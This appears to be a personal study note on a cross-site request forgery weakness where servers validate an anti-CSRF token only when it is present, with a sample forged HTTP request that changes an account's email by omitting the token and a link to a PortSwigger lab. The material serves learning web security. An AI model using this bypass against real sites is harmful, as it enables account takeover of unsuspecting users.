Parent Links : [[Cross-site request forgery (CSRF)]] > [[Common CSRF vulnerabilities]]     

### Validation of CSRF token depends on token being present
  
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.  
In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:  
```http 
POST /email/change HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 25  
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm  
  
email=pwned@evil-user.net
```

>LAB [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)